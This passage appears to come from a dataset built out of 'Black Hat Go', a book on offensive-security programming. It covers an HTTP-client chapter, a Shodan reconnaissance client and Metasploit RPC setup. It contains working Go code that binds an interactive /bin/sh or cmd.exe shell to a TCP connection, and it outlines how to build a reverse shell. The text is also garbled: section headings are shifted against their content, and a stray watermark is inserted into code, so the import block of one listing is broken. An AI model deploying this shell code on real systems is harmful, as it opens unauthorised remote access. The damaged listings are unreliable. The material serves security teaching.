and running the program on a\nWindows system, running cmd.exe instead of /bin/bash, you’ll find\nthat the connecting client never receives the command output\nbecause of some Windows-specific handling of anonymous\npipes. Here are two solutions for this problem.\nFirst, you can tweak the code to explicitly force the\nflushing of stdout to correct this nuance. Instead of assigning\nConn directly to cmd.Stdout, you implement a custom Writer that\nwraps bufio.Writer (a buffered writer) and explicitly calls its Flush\nmethod to force the buffer to be flushed. Refer to the\n“Creating the Echo Server” on page 35 for an exemplary use\nof bufio.Writer.\nHere’s the definition of the custom writer, Flusher:\n// Flusher wraps bufio.Writer, explicitly flushing on all writes.\ntype Flusher struct {\nw *bufio.Writer\n}\n// NewFlusher creates a new Flusher from an io.Writer.\nfunc NewFlusher(w io.Writer) *Flusher {\nreturn &Flusher{\nw: bufio.NewWriter(w),\n}\n}\n// Write writes bytes and explicitly flushes buffer.\n❶ func (foo *Flusher) Write(b []byte) (int, error) {\ncount, err := foo.w.Write(b)❷\nif err != nil {\nreturn -1, err\n}\nif err := foo.w.Flush()❸; err != nil {\nreturn -1, err\n}\nreturn count, err\n}\nThe Flusher type implements a Write([]byte) function ❶ that\nwrites ❷ the data to the underlying buffered writer and then\nflushes ❸ the output.\nWith the implementation of a custom writer, you can tweak\nthe connection handler to instantiate and use this Flusher custom\ntype for cmd.Stdout:\nfunc handle(conn net.Conn) {\n// Explicitly calling /bin/sh and using -i for interactive mode\n// so that we can use it for stdin and stdout.\n// For Windows use exec.Command(\"cmd.exe\").\ncmd := exec.Command(\"/bin/sh\", \"-i\")\n// Set stdin to our connection\ncmd.Stdin = conn\n// Create a Flusher from the connection to use for stdout.\n// This ensures stdout is flushed adequately and sent via net.Conn.\ncmd.Stdout = NewFlusher(conn)\n// Run the command.\nif err := cmd.Run(); err != nil {\nlog.Fatalln(err)\n}\n}\nThis solution, while adequate, certainly isn’t elegant.\nAlthough working code is more important than elegant code,\nwe’ll use this problem as an opportunity to introduce the\nHivaNetwork.Com\nio.Pipe() function, Go’s synchronous, in-memory pipe that can\nbe used for connecting Readers and Writers:\nfunc Pipe() (*PipeReader, *PipeWriter)\nUsing PipeReader and PipeWriter allows you to avoid having to\nexplicitly flush the writer and synchronously connect stdout\nand the TCP connection. You will, yet again, rewrite the\nhandler function:\nfunc handle(conn net.Conn) {\n// Explicitly calling /bin/sh and using -i for interactive mode\n// so that we can use it for stdin and stdout.\n// For Windows use exec.Command(\"cmd.exe\").\ncmd := exec.Command(\"/bin/sh\", \"-i\")\n// Set stdin to our connection\nrp, wp := io.Pipe()❶\ncmd.Stdin = conn\n❷ cmd.Stdout = wp\n❸ go io.Copy(conn, rp)\ncmd.Run()\nconn.Close()\n}\nThe call to io.Pipe() ❶ creates both a reader and a writer that\nare synchronously connected—any data written to the writer\n(wp in this example) will be read by the reader (rp). So, you\nassign the writer to cmd.Stdout ❷ and then use io.Copy(conn, rp) ❸\nto link the PipeReader to the TCP connection. You do this by\nusing a goroutine to prevent the code from blocking. Any\nstandard output from the command gets sent to the writer and\nthen subsequently piped to the reader and out over the TCP\nconnection. How’s that for elegant?\nWith that, you’ve successfully implemented Netcat’s"
  },
  {
    "input": "Summary",
    "output": "gaping security hole from the perspective of a TCP listener\nawaiting a connection. You can use similar logic to implement\nthe feature from the perspective of a connecting client\nredirecting stdout and stdin of a local binary to a remote\nlistener. The precise details are left to you to determine, but\nwould likely include the following:\nEstablish a connection to a remote listener via net.Dial(network, address string).\nInitialize a Cmd via exec.Command(name string, arg ...string).\nRedirect Stdin and Stdout properties to utilize the net.Conn object.\nRun the command.\nAt this point, the listener should receive a connection. Any\ndata sent to the client should be interpreted as stdin on the\nclient, and any data received on the listener should be\ninterpreted as stdout. The full code of this example is available\nat https://github.com/blackhat-go/bhg/blob/master/ch-\n2/netcat-exec/main.go.\nSUMMARY\nNow that you’ve explored practical applications and usage of\nGo as it relates to networking, I/O, and concurrency, let’s\nmove on to creating usable HTTP clients."
  },
  {
    "input": "3 HTTP CLIENTS AND REMOTE INTERACTION WITH TOOLS",
    "output": "3\nHTTP CLIENTS AND REMOTE\nINTERACTION WITH TOOLS\nIn Chapter 2, you learned how to harness the power of TCP\nwith various techniques for creating usable clients and servers.\nThis is the first in a series of chapters that explores a variety of\nprotocols on higher layers of the OSI model. Because of its\nprevalence on networks, its affiliation with relaxed egress\ncontrols, and its general flexibility, let’s begin with HTTP.\nThis chapter focuses on the client side. It will first\nintroduce you to the basics of building and customizing HTTP\nrequests and receiving their responses. Then you’ll learn how\nto parse structured response data so the client can interrogate\nthe information to determine actionable or relevant data.\nFinally, you’ll learn how to apply these fundamentals by\nbuilding HTTP clients that interact with a variety of security\ntools and resources. The clients you develop will query and\nconsume the APIs of Shodan, Bing, and Metasploit and will\nsearch and parse document metadata in a manner similar to the\nmetadata search tool FOCA."
  },
  {
    "input": "HTTP Fundamentals with Go",
    "output": "HTTP FUNDAMENTALS WITH GO\nAlthough you don’t need a comprehensive understanding of\nHTTP, you should know some fundamentals before you get\nstarted.\nFirst, HTTP is a stateless protocol: the server doesn’t\ninherently maintain state and status for each request. Instead,\nstate is tracked through a variety of means, which may include\nsession identifiers, cookies, HTTP headers, and more. The\nclient and servers have a responsibility to properly negotiate\nand validate this state.\nSecond, communications between clients and servers can\noccur either synchronously or asynchronously, but they\noperate on a request/response cycle. You can include several\noptions and headers in the request in order to influence the\nbehavior of the server and to create usable web applications.\nMost commonly, servers host files that a web browser renders\nto produce a graphical, organized, and stylish representation of\nthe data. But the endpoint can serve arbitrary data types. APIs\ncommonly communicate via more structured data encoding,\nsuch as XML, JSON, or MSGRPC. In some cases, the data\nretrieved may be in binary format, representing an arbitrary\nfile type for download.\nFinally, Go contains convenience functions so you can\nquickly and easily build and send HTTP requests to a server\nand subsequently retrieve and process the response. Through\nsome of the mechanisms you’ve learned in previous chapters,\nyou’ll find that the conventions for handling structured data\nprove extremely convenient when interacting with HTTP\nAPIs.\nCalling HTTP APIs\nCalling HTTP APIs\nLet’s begin the HTTP discussion by examining basic requests.\nGo’s net/http standard package contains several convenience\nfunctions to quickly and easily send POST, GET, and HEAD\nrequests, which are arguably the most common HTTP verbs\nyou’ll use. These functions take the following forms:\nGet(url string) (resp *Response, err error)\nHead(url string) (resp *Response, err error)\nPost(url string, bodyType string, body io.Reader) (resp *Response, err error)\nEach function takes—as a parameter—the URL as a string\nvalue and uses it for the request’s destination. The Post()\nfunction is slightly more complex than the Get() and Head()\nfunctions. Post() takes two additional parameters: bodyType,\nwhich is a string value that you use for the Content-Type\nHTTP header (commonly application/x-www-form-urlencoded) of the\nrequest body, and an io.Reader, which you learned about in\nChapter 2.\nYou can see a sample implementation of each of these\nfunctions in Listing 3-1. (All the code listings at the root\nlocation of / exist under the provided github repo\nhttps://github.com/blackhat-go/bhg/.) Note that the POST\nrequest creates the request body from form values and sets the\nContent-Type header. In each case, you must close the\nresponse body after you’re done reading data from it.\nr1, err := http.Get(\"http://www.google.com/robots.txt\")\n// Read response body. Not shown.\ndefer r1.Body.Close()\nr2, err := http.Head(\"http://www.google.com/robots.txt\")\n// Read response body. Not shown.\ndefer r2.Body.Close()\nform := url.Values{}\nform.Add(\"foo\", \"bar\")\nr3, err = http.Post❶(\n\"https://www.google.com/robots.txt\",\n❷ \"application/x-www-form-urlencoded\",\nstrings.NewReader(form.Encode()❸),\n)\n// Read response body. Not shown.\ndefer r3.Body.Close()\nListing 3-1: Sample implementations of the Get(), Head(), and Post() functions (/ch-\n3/basic/main.go)\nThe POST function call ❶ follows the fairly common\npattern of setting the Content-Type to application/x-www-form-\nurlencoded ❷, while URL-encoding form data ❸.\nGo has an additional POST request convenience function,\ncalled PostForm(), which removes the tediousness of setting\nthose values and manually encoding every request; you can\nsee its syntax here:\nfunc PostForm(url string, data url.Values) (resp *Response, err error)\nIf you want to substitute the PostForm() function for the Post()\nimplementation in Listing 3-1, you use something like the bold\ncode in Listing 3-2.\nform := url.Values{}\nform.Add(\"foo\", \"bar\")\nr3, err := http.PostForm(\"https://www.google.com/robots.txt\", form)\n// Read response body and close.\nListing 3-2: Using the PostForm() function instead of Post() (/ch-3/basic/main.go)\nUnfortunately, no convenience functions exist for other\nHTTP verbs, such as PATCH, PUT, or DELETE. You’ll use\nthese verbs mostly to interact with RESTful APIs, which\nemploy general guidelines on how and why a server should\nuse them; but nothing is set in stone, and HTTP is like the Old\nWest when it comes to verbs. In fact, we’ve often toyed with\nthe idea of creating a new web framework that exclusively\nuses DELETE for everything. we’d call it DELETE.js, and it\nwould be a top hit on Hacker News for sure. By reading this,\nyou’re agreeing not to steal this idea!\nGenerating a Request\nTo generate a request with one of these verbs, you can use the\nNewRequest() function to create the Request struct, which you’ll\nsubsequently send using the Client function’s Do() method. We\npromise that it’s simpler than it sounds. The function\nprototype for http.NewRequest() is as follows:\nfunc NewRequest(❶method, ❷url string, ❸body io.Reader) (req *Request, err\nerror)\nYou need to supply the HTTP verb ❶ and destination URL\n❷ to NewRequest() as the first two string parameters. Much like\nthe first POST example in Listing 3-1, you can optionally\nsupply the request body by passing in an io.Reader as the third\nand final parameter ❸.\nListing 3-3 shows a call without an HTTP body—a\nDELETE request.\nreq, err := http.NewRequest(\"DELETE\", \"https://www.google.com/robots.txt\", nil)\nvar client http.Client\nresp, err := client.Do(req)\n// Read response body and close.\nListing 3-3: Sending a DELETE request (/ch-3/basic/main.go)\nNow, Listing 3-4 shows a PUT request with an io.Reader\nbody (a PATCH request looks similar).\nform := url.Values{}\nform.Add(\"foo\", \"bar\")\nvar client http.Client\nreq, err := http.NewRequest(\n\"PUT\",\n\"https://www.google.com/robots.txt\",\nstrings.NewReader(form.Encode()),\n)\nresp, err := client.Do(req)\n// Read response body and close.\nListing 3-4: Sending a PUT request (/ch-3/basic/main.go)\nThe standard Go net/http library contains several functions\nthat you can use to manipulate the request before it’s sent to\nthe server. You’ll learn some of the more relevant and\napplicable variants as you work through practical examples\nthroughout this chapter. But first, we’ll show you how to do\nsomething meaningful with the HTTP response that the server\nreceives.\nUsing Structured Response Parsing\nIn the previous section, you learned the mechanisms for\nbuilding and sending HTTP requests in Go. Each of those\nexamples glossed over response handling, essentially ignoring\nit for the time being. But inspecting various components of the\nHTTP response is a crucial aspect of any HTTP-related task,\nlike reading the response body, accessing cookies and headers,\nor simply inspecting the HTTP status code.\nListing 3-5 refines the GET request in Listing 3-1 to\ndisplay the status code and response body—in this case,\nGoogle’s robots.txt file. It uses the ioutil.ReadAll() function to\nread data from the response body, does some error checking,\nand prints the HTTP status code and response body to stdout.\n❶ resp, err := http.Get(\"https://www.google.com/robots.txt\")\nif err != nil {\nlog.Panicln(err)\n}\n// Print HTTP Status\nfmt.Println(resp.Status❷)\n// Read and display response body\nbody, err := ioutil.ReadAll(resp.Body❸)\nif err != nil {\nlog.Panicln(err)\n}\nfmt.Println(string(body))\n❹ resp.Body.Close()\nListing 3-5: Processing the HTTP response body (/ch-3/basic/main.go)\nOnce you receive your response, named resp ❶ in the above\ncode, you can retrieve the status string (for example, 200 OK) by\naccessing the exported Status parameter ❷; not shown in our\nexample, there is a similar StatusCode parameter that accesses\nonly the integer portion of the status string.\nThe Response type contains an exported Body parameter ❸,\nwhich is of type io.ReadCloser. An io.ReadCloser is an interface that\nacts as an io.Reader as well as an io.Closer, or an interface that\nrequires the implementation of a Close() function to close the\nreader and perform any cleanup. The details are somewhat\ninconsequential; just know that after reading the data from an\nio.ReadCloser, you’ll need to call the Close() function ❹ on the\nresponse body. Using defer to close the response body is a\ncommon practice; this will ensure that the body is closed\nbefore you return it.\nNow, run the script to see the error status and response\nbody:\n$ go run main.go\n200 OK\nUser-agent: *\nDisallow: /search\nAllow: /search/about\nDisallow: /sdch\nDisallow: /groups\nDisallow: /index.html?\nDisallow: /?\nAllow: /?hl=\nDisallow: /?hl=*&\nAllow: /?hl=*&gws_rd=ssl$\nDisallow: /?hl=*&*&gws_rd=ssl\n--snip--\nIf you encounter a need to parse more structured data—and\nit’s likely that you will—you can read the response body and\ndecode it by using the conventions presented in Chapter 2. For\nexample, imagine you’re interacting with an API that\ncommunicates using JSON, and one endpoint—say, /ping—\nreturns the following response indicating the server state:\n{\"Message\":\"All is good with the world\",\"Status\":\"Success\"}\nYou can interact with this endpoint and decode the JSON\nmessage by using the program in Listing 3-6.\npackage main\nimport {\nencoding/json\"\nHivaNetwork.Com\nlog\nnet/http\n}\n❶ type Status struct {\nMessage string\nStatus string\n}\nfunc main() {\n❷ res, err := http.Post(\n\"http://IP:PORT/ping\",\n\"application/json\",\nnil,\n)\nif err != nil {\nlog.Fatalln(err)\n}\nvar status Status\n❸ if err := json.NewDecoder(res.Body).Decode(&status); err != nil {\nlog.Fatalln(err)\n}\ndefer res.Body.Close()\nlog.Printf(\"%s -> %s\\n\", status.Status❹, status.Message❺)\n}\nListing 3-6: Decoding a JSON response body (/ch-3/basic-parsing/main.go)\nThe code begins by defining a struct called Status ❶, which\ncontains the expected elements from the server response. The\nmain() function first sends the POST request ❷ and then\ndecodes the response body ❸. After doing so, you can query\nthe Status struct as you normally would—by accessing exported\ndata types Status ❹ and Message ❺.\nThis process of parsing structured data types is consistent\nacross other encoding formats, like XML or even binary\nrepresentations. You begin the process by defining a struct to"
  },
  {
    "input": "Building an HTTP Client That Interacts with Shodan",
    "output": "represent the expected response data and then decoding the\ndata into that struct. The details and actual implementation of\nparsing other formats will be left up to you to determine.\nThe next sections will apply these fundamental concepts to\nassist you in building tools to interact with third-party APIs for\nthe purpose of enhancing adversarial techniques and\nreconnaissance.\nBUILDING AN HTTP CLIENT THAT\nINTERACTS WITH SHODAN\nPrior to performing any authorized adversarial activities\nagainst an organization, any good attacker begins with\nreconnaissance. Typically, this starts with passive techniques\nthat don’t send packets to the target; that way, detection of the\nactivity is next to impossible. Attackers use a variety of\nsources and services—including social networks, public\nrecords, and search engines—to gain potentially useful\ninformation about the target.\nIt’s absolutely incredible how seemingly benign\ninformation becomes critical when environmental context is\napplied during a chained attack scenario. For example, a web\napplication that discloses verbose error messages may, alone,\nbe considered low severity. However, if the error messages\ndisclose the enterprise username format, and if the\norganization uses single-factor authentication for its VPN,\nthose error messages could increase the likelihood of an\ninternal network compromise through password-guessing\nattacks.\nMaintaining a low profile while gathering the information\nensures that the target’s awareness and security posture\nremains neutral, increasing the likelihood that your attack will\nbe successful.\nShodan (https://www.shodan.io/), self-described as “the\nworld’s first search engine for internet-connected devices,”\nfacilitates passive reconnaissance by maintaining a searchable\ndatabase of networked devices and services, including\nmetadata such as product names, versions, locale, and more.\nThink of Shodan as a repository of scan data, even if it does\nmuch, much more.\nReviewing the Steps for Building an API Client\nIn the next few sections, you’ll build an HTTP client that\ninteracts with the Shodan API, parsing the results and\ndisplaying relevant information. First, you’ll need a Shodan\nAPI key, which you get after you register on Shodan’s\nwebsite. At the time of this writing, the fee is fairly nominal\nfor the lowest tier, which offers adequate credits for individual\nuse, so go sign up for that. Shodan occasionally offers\ndiscounted pricing, so monitor it closely if you want to save a\nfew bucks.\nNow, get your API key from the site and set it as an\nenvironment variable. The following examples will work as-is\nonly if you save your API key as the variable SHODAN_API_KEY.\nRefer to your operating system’s user manual, or better yet,\nlook at Chapter 1 if you need help setting the variable.\nBefore working through the code, understand that this\nsection demonstrates how to create a bare-bones\nimplementation of a client—not a fully featured,\ncomprehensive implementation. However, the basic\nscaffolding you’ll build now will allow you to easily extend\nthe demonstrated code to implement other API calls as you\nmay need.\nThe client you build will implement two API calls: one to\nquery subscription credit information and the other to search\nfor hosts that contain a certain string. You use the latter call\nfor identifying hosts; for example, ports or operating systems\nmatching a certain product.\nLuckily, the Shodan API is straightforward, producing\nnicely structured JSON responses. This makes it a good\nstarting point for learning API interaction. Here is a high-level\noverview of the typical steps for preparing and building an\nAPI client:\n1. Review the service’s API documentation.\n2. Design a logical structure for the code in order to reduce complexity and\nrepetition.\n3. Define request or response types, as necessary, in Go.\n4. Create helper functions and types to facilitate simple initialization,\nauthentication, and communication to reduce verbose or repetitive logic.\n5. Build the client that interacts with the API consumer functions and types.\nWe won’t explicitly call out each step in this section, but\nyou should use this list as a map to guide your development.\nStart by quickly reviewing the API documentation on\nShodan’s website. The documentation is minimal but produces\neverything needed to create a client program.\nDesigning the Project Structure\nWhen building an API client, you should structure it so that\nthe function calls and logic stand alone. This allows you to\nreuse the implementation as a library in other projects. That\nway, you won’t have to reinvent the wheel in the future.\nBuilding for reusability slightly changes a project’s structure.\nFor the Shodan example, here’s the project structure:\n$ tree github.com/blackhat-go/bhg/ch-3/shodan\ngithub.com/blackhat-go/bhg/ch-3/shodan\n|---cmd\n| |---shodan\n| |---main.go\n|---shodan\n|---api.go\n|---host.go\n|---shodan.go\nThe main.go file defines package main and is used primarily as\na consumer of the API you’ll build; in this case, you use it\nprimarily to interact with your client implementation.\nThe files in the shodan directory—api.go, host.go, and\nshodan.go—define package shodan, which contains the types and\nfunctions necessary for communication to and from Shodan.\nThis package will become your stand-alone library that you\ncan import into various projects.\nCleaning Up API Calls\nWhen you perused the Shodan API documentation, you may\nhave noticed that every exposed function requires you to send\nyour API key. Although you certainly can pass that value\naround to each consumer function you create, that repetitive\ntask becomes tedious. The same can be said for either\nhardcoding or handling the base URL (https://api.shodan.io/).\nFor example, defining your API functions, as in the following\nsnippet, requires you to pass in the token and URL to each\nfunction, which isn’t very elegant:\nfunc APIInfo(token, url string) { --snip-- }\nfunc HostSearch(token, url string) { --snip-- }\nInstead, opt for a more idiomatic solution that allows you\nto save keystrokes while arguably making your code more\nreadable. To do this, create a shodan.go file and enter the code\nin Listing 3-7.\npackage shodan\n❶ const BaseURL = \"https://api.shodan.io\"\n❷ type Client struct {\napiKey string\n}\n❸ func New(apiKey string) *Client {\nreturn &Client{apiKey: apiKey}\n}\nListing 3-7: Shodan Client definition (/ch-3/shodan/shodan/shodan.go)\nThe Shodan URL is defined as a constant value ❶; that\nway, you can easily access and reuse it within your\nimplementing functions. If Shodan ever changes the URL of\nits API, you’ll have to make the change at only this one\nlocation in order to correct your entire codebase. Next, you\ndefine a Client struct, used for maintaining your API token\nacross requests ❷. Finally, the code defines a New() helper\nfunction, taking the API token as input and creating and\nreturning an initialized Client instance ❸. Now, rather than\ncreating your API code as arbitrary functions, you create them\nas methods on the Client struct, which allows you to interrogate\nthe instance directly rather than relying on overly verbose\nfunction parameters. You can change your API function calls,\nwhich we’ll discuss momentarily, to the following:\nfunc (s *Client) APIInfo() { --snip-- }\nfunc (s *Client) HostSearch() { --snip-- }\nSince these are methods on the Client struct, you can retrieve\nthe API key through s.apiKey and retrieve the URL through\nBaseURL. The only prerequisite to calling the methods is that\nyou create an instance of the Client struct first. You can do this\nwith the New() helper function in shodan.go.\nQuerying Your Shodan Subscription\nNow you’ll start the interaction with Shodan. Per the Shodan\nAPI documentation, the call to query your subscription plan\ninformation is as follows:\nhttps://api.shodan.io/api-info?key={YOUR_API_KEY}\nThe response returned resembles the following structure.\nObviously, the values will differ based on your plan details\nand remaining subscription credits.\n{\n\"query_credits\": 56,\n\"scan_credits\": 0,\n\"telnet\": true,\n\"plan\": \"edu\",\n\"https\": true,\n\"unlocked\": true,\n}\nFirst, in api.go, you’ll need to define a type that can be\nused to unmarshal the JSON response to a Go struct. Without\nit, you won’t be able to process or interrogate the response\nbody. In this example, name the type APIInfo:\ntype APIInfo struct {\nQueryCredits int `json:\"query_credits\"`\nScanCredits int `json:\"scan_credits\"`\nTelnet bool `json:\"telnet\"`\nPlan string `json:\"plan\"`\nHTTPS bool `json:\"https\"`\nUnlocked bool `json:\"unlocked\"`\n}\nThe awesomeness that is Go makes that structure and\nJSON alignment a joy. As shown in Chapter 1, you can use\nsome great tooling to “automagically” parse JSON—\npopulating the fields for you. For each exported type on the\nstruct, you explicitly define the JSON element name with\nstruct tags so you can ensure that data is mapped and parsed\nproperly.\nNext you need to implement the function in Listing 3-8,\nwhich makes an HTTP GET request to Shodan and decodes\nthe response into your APIInfo struct:\nfunc (s *Client) APIInfo() (*APIInfo, error) {\nres, err := http.Get(fmt.Sprintf(\"%s/api-info?key=%s\", BaseURL, s.apiKey))❶\nif err != nil {\nreturn nil, err\n}\ndefer res.Body.Close()\nvar ret APIInfo\nif err := json.NewDecoder(res.Body).Decode(&ret)❷; err != nil {\nreturn nil, err\n}\nreturn &ret, nil\n}\nListing 3-8: Making an HTTP GET request and decoding the response (/ch-\n3/shodan/shodan/api.go)\nThe implementation is short and sweet. You first issue an\nHTTP GET request to the /api-info resource ❶. The full URL is\nbuilt using the BaseURL global constant and s.apiKey. You then\ndecode the response into your APIInfo struct ❷ and return it to\nthe caller.\nBefore writing code that utilizes this shiny new logic, build\nout a second, more useful API call—the host search—which\nyou’ll add to host.go. The request and response, according to\nthe API documentation, is as follows:\nhttps://api.shodan.io/shodan/host/search?key={YOUR_API_KEY}&query=\n{query}&facets={facets}\n{\n\"matches\": [\n{\n\"os\": null,\n\"timestamp\": \"2014-01-15T05:49:56.283713\",\n\"isp\": \"Vivacom\",\n\"asn\": \"AS8866\",\n\"hostnames\": [ ],\n\"location\": {\n\"city\": null,\n\"region_code\": null,\n\"area_code\": null,\n\"longitude\": 25,\n\"country_code3\": \"BGR\",\n\"country_name\": \"Bulgaria\",\n\"postal_code\": null,\n\"dma_code\": null,\n\"country_code\": \"BG\",\n\"latitude\": 43\n},\n\"ip\": 3579573318,\n\"domains\": [ ],\n\"org\": \"Vivacom\",\n\"data\": \"@PJL INFO STATUS CODE=35078 DISPLAY=\"Power Saver\"\nONLINE=TRUE\",\n\"port\": 9100,\n\"ip_str\": \"213.91.244.70\"\n},\n--snip--\n],\n\"facets\": {\n\"org\": [\n{\n\"count\": 286,\n\"value\": \"Korea Telecom\"\n},\n--snip--\n]\n},\n\"total\": 12039\n}\nCompared to the initial API call you implemented, this one\nis significantly more complex. Not only does the request take\nmultiple parameters, but the JSON response contains nested\ndata and arrays. For the following implementation, you’ll\nignore the facets option and data, and instead focus on\nperforming a string-based host search to process only the\nmatches element of the response.\nAs you did before, start by building the Go structs to\nhandle the response data; enter the types in Listing 3-9 into\nyour host.go file.\ntype HostLocation struct {\nCity string `json:\"city\"`\nRegionCode string `json:\"region_code\"`\nAreaCode int `json:\"area_code\"`\nLongitude float32 `json:\"longitude\"`\nHivaNetwork.Com\nCountryCode3 string `json:\"country_code3\"`\nCountryName string `json:\"country_name\"`\nPostalCode string `json:\"postal_code\"`\nDMACode int `json:\"dma_code\"`\nCountryCode string `json:\"country_code\"`\nLatitude float32 `json:\"latitude\"`\n}\ntype Host struct {\nOS string `json:\"os\"`\nTimestamp string `json:\"timestamp\"`\nISP string `json:\"isp\"`\nASN string `json:\"asn\"`\nHostnames []string `json:\"hostnames\"`\nLocation HostLocation `json:\"location\"`\nIP int64 `json:\"ip\"`\nDomains []string `json:\"domains\"`\nOrg string `json:\"org\"`\nData string `json:\"data\"`\nPort int `json:\"port\"`\nIPString string `json:\"ip_str\"`\n}\ntype HostSearch struct {\nMatches []Host `json:\"matches\"`\n}\nListing 3-9: Host search response data types (/ch-3/shodan/shodan/host.go)\nThe code defines three types:\nHostSearch Used for parsing the matches array\nHost Represents a single matches element\nHostLocation Represents the location element within the host\nNotice that the types may not define all response fields. Go\nhandles this elegantly, allowing you to define structures with\nonly the JSON fields you care about. Therefore, our code will\nparse the JSON just fine, while reducing the length of your\ncode by including only the fields that are most relevant to the\nexample. To initialize and populate the struct, you’ll define the\nfunction in Listing 3-10, which is similar to the APIInfo()\nmethod you created in Listing 3-8.\nfunc (s *Client) HostSearch(q string❶) (*HostSearch, error) {\nres, err := http.Get( ❷\nfmt.Sprintf(\"%s/shodan/host/search?key=%s&query=%s\", BaseURL,\ns.apiKey, q),\n)\nif err != nil {\nreturn nil, err\n}\ndefer res.Body.Close()\nvar ret HostSearch\nif err := json.NewDecoder(res.Body).Decode(&ret)❸; err != nil {\nreturn nil, err\n}\nreturn &ret, nil\n}\nListing 3-10: Decoding the host search response body (/ch-\n3/shodan/shodan/host.go)\nThe flow and logic is exactly like the APIInfo() method,\nexcept that you take the search query string as a parameter ❶,\nissue the call to the /shodan/host/search endpoint while passing the\nsearch term ❷, and decode the response into the HostSearch\nstruct ❸.\nYou repeat this process of structure definition and function\nimplementation for each API service you want to interact with.\nRather than wasting precious pages here, we’ll jump ahead\nand show you the last step of the process: creating the client\nthat uses your API code.\nCreating a Client\nYou’ll use a minimalistic approach to create your client: take a\nsearch term as a command line argument and then call the\nAPIInfo() and HostSearch() methods, as in Listing 3-11.\nfunc main() {\nif len(os.Args) != 2 {\nlog.Fatalln(\"Usage: shodan searchterm\")\n}\napiKey := os.Getenv(\"SHODAN_API_KEY\")❶\ns := shodan.New(apiKey)❷\ninfo, err := s.APIInfo()❸\nif err != nil {\nlog.Panicln(err)\n}\nfmt.Printf(\n\"Query Credits: %d\\nScan Credits: %d\\n\\n\",\ninfo.QueryCredits,\ninfo.ScanCredits)\nhostSearch, err := s.HostSearch(os.Args[1])❹\nif err != nil {\nlog.Panicln(err)\n}\n❺ for _, host := range hostSearch.Matches {\nfmt.Printf(\"%18s%8d\\n\", host.IPString, host.Port)\n}\n}\nListing 3-11: Consuming and using the shodan package (/ch-\n3/shodan/cmd/shodan/main.go)\nStart by reading your API key from the SHODAN_API_KEY\nenvironment variable ❶. Then use that value to initialize a\nnew Client struct ❷, s, subsequently using it to call your APIInfo()"
  },
  {
    "input": "Interacting with Metasploit",
    "output": "method ❸. Call the HostSearch() method, passing in a search\nstring captured as a command line argument ❹. Finally, loop\nthrough the results to display the IP and port values for those\nservices matching the query string ❺. The following output\nshows a sample run, searching for the string tomcat:\n$ SHODAN_API_KEY=YOUR-KEY go run main.go tomcat\nQuery Credits: 100\nScan Credits: 100\n185.23.138.141 8081\n218.103.124.239 8080\n123.59.14.169 8081\n177.6.80.213 8181\n142.165.84.160 10000\n--snip--\nYou’ll want to add error handling and data validation to\nthis project, but it serves as a good example for fetching and\ndisplaying Shodan data with your new API. You now have a\nworking codebase that can be easily extended to support and\ntest the other Shodan functions.\nINTERACTING WITH METASPLOIT\nMetasploit is a framework used to perform a variety of\nadversarial techniques, including reconnaissance, exploitation,\ncommand and control, persistence, lateral network movement,\npayload creation and delivery, privilege escalation, and more.\nEven better, the community version of the product is free, runs\non Linux and macOS, and is actively maintained. Essential for\nany adversarial engagement, Metasploit is a fundamental tool\nused by penetration testers, and it exposes a remote procedure\ncall (RPC) API to allow remote interaction with its\nfunctionality.\nIn this section, you’ll build a client that interacts with a\nremote Metasploit instance. Much like the Shodan code you\nbuilt, the Metasploit client you develop won’t cover a\ncomprehensive implementation of all available functionality.\nRather, it will be the foundation upon which you can extend\nadditional functionality as needed. We think you’ll find the\nimplementation more complex than the Shodan example,\nmaking the Metasploit interaction a more challenging\nprogression.\nSetting Up Your Environment\nBefore you proceed with this section, download and install the\nMetasploit community edition if you don’t already have it.\nStart the Metasploit console as well as the RPC listener\nthrough the msgrpc module in Metasploit. Then set the server\nhost—the IP on which the RPC server will listen—and a\npassword, as shown in Listing 3-12.\n$ msfconsole\nmsf > load msgrpc Pass=s3cr3t ServerHost=10.0.1.6\n[*] MSGRPC Service: 10.0.1.6:55552\n[*] MSGRPC Username: msf\n[*] MSGRPC Password: s3cr3t\n[*] Successfully loaded plugin: msgrpc\nListing 3-12: Starting Metasploit and the msgrpc server\nTo make the code more portable and avoid hardcoding\nvalues, set the following environment variables to the values\nyou defined for your RPC instance. This is similar to what you\ndid for the Shodan API key used to interact with Shodan in\n“Creating a Client” on page 58.\n$ export MSFHOST=10.0.1.6:55552\n$ export MSFPASS=s3cr3t\nYou should now have Metasploit and the RPC server\nrunning.\nBecause the details on exploitation and Metasploit use are\nbeyond the scope of this book,1 let’s assume that through pure\ncunning and trickery you’ve already compromised a remote\nWindows system and you’ve leveraged Metasploit’s\nMeterpreter payload for advanced post-exploitation activities.\nHere, your efforts will instead focus on how you can remotely\ncommunicate with Metasploit to list and interact with\nestablished Meterpreter sessions. As we mentioned before, this\ncode is a bit more cumbersome, so we’ll purposely pare it\nback to the bare minimum—just enough for you to take the\ncode and extend it for your specific needs.\nFollow the same project roadmap as the Shodan example:\nreview the Metasploit API, lay out the project in library\nformat, define data types, implement client API functions, and,\nfinally, build a test rig that uses the library.\nFirst, review the Metasploit API developer documentation\nat Rapid7’s official website\n(https://metasploit.help.rapid7.com/docs/rpc-api/). The\nfunctionality exposed is extensive, allowing you to do just\nabout anything remotely that you could through local\ninteraction. Unlike Shodan, which uses JSON, Metasploit\ncommunicates using MessagePack, a compact and efficient\nbinary format. Because Go doesn’t contain a standard\nMessagePack package, you’ll use a full-featured community\nimplementation. Install it by executing the following from the\ncommand line:\n$ go get gopkg.in/vmihailenco/msgpack.v2\nIn the code, you’ll refer to the implementation as msgpack.\nDon’t worry too much about the details of the MessagePack\nspec. You’ll see shortly that you’ll need to know very little\nabout MessagePack itself to build a working client. Go is great\nbecause it hides a lot of these details, allowing you to instead\nfocus on business logic. What you need to know are the basics\nof annotating your type definitions in order to make them\n“MessagePack-friendly.” Beyond that, the code to initiate\nencoding and decoding is identical to other formats, such as\nJSON and XML.\nNext, create your directory structure. For this example, you\nuse only two Go files:\n$ tree github.com/blackhat-go/bhg/ch-3/metasploit-minimal\ngithub.com/blackhat-go/bhg/ch-3/metasploit-minimal\n|---client\n| |---main.go\n|---rpc\n|---msf.go\nThe msf.go file resides within the rpc package, and you’ll\nuse client/main.go to implement and test the library you build.\nDefining Your Objective\nNow, you need to define your objective. For the sake of\nbrevity, implement the code to interact and issue an RPC call\nthat retrieves a listing of current Meterpreter sessions—that is,\nthe session.list method from the Metasploit developer\ndocumentation. The request format is defined as follows:\n[ \"session.list\", \"token\" ]\nThis is minimal; it expects to receive the name of the\nmethod to implement and a token. The token value is a\nplaceholder. If you read through the documentation, 